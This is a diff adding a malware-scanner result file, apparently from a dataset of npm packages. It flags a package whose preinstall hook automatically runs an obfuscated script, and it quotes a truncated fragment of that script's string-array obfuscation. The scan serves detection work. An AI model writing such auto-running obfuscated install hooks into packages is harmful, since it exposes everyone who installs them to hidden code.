@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\": \"node vinlcym.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": [
+            {
+                "location": "package/vinlcym.js:1",
+                "code": "const a0_0xca9003=a0_0x26c7;function a0_0x3737(){const _0x3733a0=['8yYeLtn','join','93dcFeQg','911669ftWpah','2QDEJoK','767fXAWBm','12WTebVv','10MRtkJJ','102gXDvVe','47110VljtpK','end','7558747SDhgGa','request','https','from','256214AKVosT'...(0xaa)]();",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/wafer-form-1.30.1"
+}
